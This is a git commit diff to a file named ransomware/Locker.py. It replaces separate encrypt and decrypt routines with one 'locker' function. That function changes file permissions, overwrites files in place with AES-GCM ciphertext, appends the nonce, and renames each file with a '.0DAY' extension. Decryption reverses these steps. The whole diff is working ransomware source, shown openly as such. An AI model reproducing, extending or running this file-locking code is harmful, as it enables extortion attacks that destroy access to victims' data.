56c44fb3ef473ca470a0de72b9b4fee085102373
Arunanshu Biswas <48434243+arunanshub@users.noreply.github.com>
2019-06-18 12:50:44 +0530

    Changed the whole function

--- ransomware/Locker.py
+++ ransomware/Locker.py
@@ -4,100 +4,93 @@ from Cryptodome import Random         # collision with Pycrypto/Pycryptodome pac
 import hashlib                        # Use pip (or conda) install cryptodomex.
 
 
+BLOCKSIZE = 128
+NONCE_SIZE = 12
 EXT = '.0DAY'
 
-def _writer(filepath, method, append_iv=None):
-  
+def _writer(filepath, method, flag, add_iv=None):
   """
-  This function will take the filepath and write
-  new message as provided by the *method* in-place.
-  If *append_iv* is given, the Initialization Vector
-  will be appended to the end of the file. And also it randomly 
-  generates false keys to prevent extraction of original keys.
-  Also, to enable read-write under the hood, the permissions are 
-  modified using `os.chmod(...)` ;)
+  This function takes care of writing to the file - *filepath*
+  with the provided method by looping through each line of the 
+  file of fixed length, specified by BLOCK_SIZE in global namespace.
+  
+    Usage
+   -------
+  filepath = File to be written on.
+  
+    method = The way in which the file must be overwritten.
+             (encrypt or decrypt)
+  
+      flag = This is to identify if the method being used is
+             for encryption or decryption.
+  
+    add_iv = The *nonce* or *Initialization vector* to be written
+             to the file. More preferably *nonce*
   """
   
-  path = os.path.normpath(filepath)
-  os.chmod(path, stat.S_IRWXU)
-  with open(path, 'rb+') as fh:
+  os.chmod(filepath, stat.S_IRWXU)
+  with open(filepath, 'rb+') as f:
+    part = f.read(BLOCKSIZE)
+    while part:
+      new_line = method(part)
+      f.seek(-len(part), 1)
+      f.write(new_line)
+      
+      part = f.read(BLOCKSIZE)
+    
+    # identify if the file is being encrypted
+    if flag and add_iv:
+      f.write(add_iv)
 
-    for line in fh:
-      new_line = method(line)
-      fh.seek(-len(line), 1)
-      fh.write(new_line)
-
-    if append_iv:
-      fh.seek(0,2)
-      fh.write(append_iv)
-
-def encrypt(filepath, key):
-  
+def locker(filepath, key):
   """
-  This function will encrypt the contents of file,
-  provided the *filepath* . The writer function 
-  helps it achieve the goal. Finally it appends the
-  Initialization vector *iv* at the end.
+  This function either encrypts or decrypts the file - *filepath*.
+  Encryption or decryption depends upon the file's extension.
   
-  And as a final touch, it adds a sweet '.0day' extension
-  at the end of the file. And also it randomly generates false keys
-  to prevent extraction of original keys.
-  
-  Note: Encrypt may perform slow on large files, but decryption spped
-        is not affected (which is very suspicious). The decrypted files
-        are returned in perfect state.
+    Usage
+   -------
+   filepath = File to be written on.
+        
+        key = Key to be used for encryption/decryption
   """
   
-  path = os.path.normpath(filepath)
-  
-  if path.endswith(EXT):
-    return
-  
-  try:
+  try:  
     keyb = hashlib.sha3_256(key.encode()).digest()
-    iv = Random.new().read(AES.block_size)
-    cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
     
-    _writer(path, cipher_gcm.encrypt, append_iv=iv)
+    # Check if file ends with the required extension.
+    # If it does decrypt the file with the given key.
+    if filepath.endswith(EXT):
+      method = 'decrypt'
+      flag = False
+      with open(filepath, 'rb+') as f:
+        f.seek(-NONCE_SIZE,2)
+        iv = f.read()
+      os.truncate(filepath, os.path.getsize(filepath) - NONCE_SIZE)
     
-    os.rename(path, path+EXT)
+    # If the file doesn't end with the required extension,
+    # then identify the method as `encrypt` and do the same
+    # with the key provided.
+    else:
+      method = 'encrypt'
+      flag = True
+      iv = Random.new().read(NONCE_SIZE)
     
-    #for _ in range(100): keyb = os.urandom(16)
+    # Make a cipher object with the nonce and key and write
+    # to the file with the arguments.
+    crp = getattr(AES.new(keyb, AES.MODE_GCM, nonce=iv), method)
+    _writer(filepath, crp, flag, iv)
+    
+    # If the file is being encrypted, add an extension EXT to
+    # the end of the file.
+    if flag:
+      os.rename(filepath, filepath+EXT)
+    
+    # If the file is being decrypted, get the original extension
+    # and remove the extension EXT.
+    else:
+      origpath = os.path.splitext(filepath)[0]
+      os.rename(filepath, origpath)
+  
   except FileNotFoundError:
     pass
-  
-def decrypt(filepath, key):
-  """
-  This function will decrypt the contents of file,
-  provided the *filepath* . The writer function 
-  helps it achieve the goal. It extracts the Initialization
-  Vector *iv* from the end of the file.
-  
-  And to keep things cool, it returns the original file by
-  removing the '.0day' extension.
-  """
-  
-  path = os.path.normpath(filepath)
-  
-  if not path.endswith(EXT):
-    return
-  
-  try:
-    with open(path, 'rb+') as f:
-      original_size = os.path.getsize(path) - 16
-      f.seek(-16, 2)
-      iv = f.read(16)
-      f.truncate(original_size)
     
-    keyb = hashlib.sha3_256(key.encode()).digest()
-    cipher_gcm = AES.new(keyb, AES.MODE_GCM, iv)
-    
-    _writer(path, cipher_gcm.decrypt)
-    
-    original_path = os.path.splitext(path)[0]
-    
-    os.rename(path, original_path)
-    
-    #for _ in range(100): keyb = os.urandom(16)
-  except FileNotFoundError:
-    pass
